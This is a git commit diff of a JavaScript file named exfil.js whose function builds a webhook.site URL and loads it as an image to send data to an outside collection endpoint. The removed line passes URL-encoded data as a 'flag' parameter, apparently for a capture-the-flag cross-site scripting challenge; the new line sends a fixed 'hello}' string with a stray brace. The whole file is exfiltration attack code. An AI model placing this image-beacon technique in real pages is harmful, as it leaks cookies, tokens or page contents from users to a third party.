ac61b23602ccb8b5914c48456760d2021faf0ac7
RobertoHoungbo <143407538+RobertoHoungbo@users.noreply.github.com>
2025-05-03 23:43:14 +0200

    Update exfil.js

--- exfil.js
+++ exfil.js
@@ -1,5 +1,5 @@
 function exfiltrate(data) {
-  const exfilUrl = `https://webhook.site/4821a7ad-0120-4e83-aae0-4328fe954b59?flag=${encodeURIComponent(data)}`;
+  const exfilUrl = `https://webhook.site/4821a7ad-0120-4e83-aae0-4328fe954b59?flag=hello}`;
   new Image().src = exfilUrl;
 }
 
